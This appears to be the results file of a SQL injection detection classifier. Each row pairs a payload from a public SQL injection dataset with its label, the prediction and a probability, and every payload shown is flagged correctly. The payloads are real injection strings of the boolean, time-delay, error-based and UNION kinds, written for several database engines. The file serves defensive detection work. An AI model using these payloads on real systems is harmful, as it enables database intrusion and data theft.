text,source,true_label,pred_label,prob_sqli,correct
"-9829'  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" )  as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1' )  as jwvp where 5231 = 5231 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1' and 7533 = 7533 and 'clqy' like 'clqy,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""ejmj"" like ""ejmj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%'  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""gcnq"" like ""gcnq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'|| ( select 'zwcp' where 3333 = 3333,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'+ ( select 'zgtu' where 8419 = 8419,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-9504%""  )  )   or 8098 = 7472",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1 )  where 9649 = 9649 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" and make_set ( 4214 = 9503,9503 )  and ""phjg"" like ""phjg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1' )  where 6214 = 6214 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1""  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( ""felm"" = ""felm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-7916'  )  )   union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"-7551 or elt ( 6900 = 7195,7195 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999915361404419,1
if ( 3245 = 6168 )  select 3245 else drop function nafj--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1, ( select  ( case when  ( 1570 = 1570 )  then  ( select 1570 from pg_sleep ( 5  )  )   else 1/ ( select 0 )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%"" )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%' )  union all select null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
-1257' )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"-4739'  )  )   union all select 6585,6585,6585,6585,6585--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-3472' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'  )  )   as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%""  )  )   )  and make_set ( 8191 = 7813,7813 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%"" )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' where 6963 = 6963 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 )  as kqas where 7302 = 7302 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'pbqg' = 'pbqg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1%'  )  )   or sleep ( 5 )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" )  as ronb where 9368 = 9368",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
select  ( case when  ( 5142 = 6855 )  then 5142 else 5142* ( select 5142 from mysql.db )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1  )  )   as xoch where 8765 = 8765 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'qtfl' = 'qtfl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
-4873'  )  )   )  or 3038 = 3038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
select  ( case when  ( 2132 = 8969 )  then 1 else 2132* ( select 2132 from master..sysdatabases )  end ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%'  )  )   union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" )  where 2016 = 2016 and  ( 1547 = 2093 ) *2093--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
-5313'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'wkkp' like 'wkkp,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-7482""  )  )   )  or 9077 = 2651",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1%' and 2006 = 2006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
-9673 )  or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 )  where 1100 = 1100 and sleep ( 5 ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'nqam' = 'nqam",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and 'iwmy' = 'iwmy,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'+ ( select mcfb where 4050 = 4050 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-6475""  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""mdsx"" like ""mdsx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'nbsf' like 'nbsf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 rlike sleep ( 5 ) # urxh,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999895095825195,1
"1%'  )  )   union all select null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 8382 = 8382",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1%'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1', ( select  ( case when  ( 4209 = 5879 )  then 1 else 4209* ( select 4209 from information_schema.character_sets )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-2314""  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  ""uatq"" like ""uatq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-8836%' )  or 4856 = 3891,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999911785125732,1
"1""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""bxct"" like ""bxct",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( ""tgdu"" = ""tgdu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
end and   (  (  'zeyr' = 'zeyr,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999993085861206,1
"1%""  )  )   )  union all select null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
-9484' or  ( 7129 = 2349 ) *2349 and 'fcsa' like 'fcsa,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'+ ( select dklj where 3265 = 3265,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) -- fwzl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999993085861206,1
"-6405 )  as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%""  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
-4595' )  where 4892 = 4892 order by 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  8294 = 8294",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'  )  )   as xirr where 2425 = 2425,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1, ( begin if  ( 8340 = 8340 )  then dbms_lock.sleep ( 5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'|| ( select 'yhkt' from dual where 7105 = 7105 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
select case when 7717 = 7717 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999892711639404,1
"1"" where 6785 = 6785 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'|| ( select 'sxya' where 3578 = 3578,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1' or 6793 =  ( select 6793 from pg_sleep ( 5  )  ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 )  as idvt where 3490 = 3490 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'aqdj' = 'aqdj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 )  where 6039 = 6039 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-4371'  )  )   )  union all select 7465,7465,7465,7465,7465,7465,7465#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-7561 )  as ilrm where 8828 = 8828 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'+ ( select 'myrb' where 3622 = 3622 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" where 4688 = 4688 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1%' )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  9542 = 9542",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1""  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  3508 = 3508",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1' in boolean mode )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'  )  )   as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""qqfd"" like ""qqfd",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999993085861206,1
"1' )  as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1' )  where 4509 = 4509 union all select null--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1'+ ( select 'qaar' where 7841 = 7841 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  ""xjdh"" = ""xjdh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1""  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  ""isbh"" like ""isbh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'ckpm' = 'ckpm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'zwyx' = 'zwyx,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'|| ( select 'tjzy' where 3037 = 3037,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1' )  as fyib where 9246 = 9246,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 and 2620 = 2175,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999819993972778,1
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""zxks"" = ""zxks",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1' )  where 3311 = 3311,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""pyfz"" like ""pyfz",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""jydy"" like ""jydy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1'+ ( select mhfn where 2425 = 2425,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 3294 = 3294",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 'lkun' like 'lkun",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-3518 )  union all select 1877,1877,1877,1877#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" )  as fcrx where 2929 = 2929 and 2820 = 5133",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-4580"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""dbhb"" = ""dbhb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  and 8677 = 9054#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
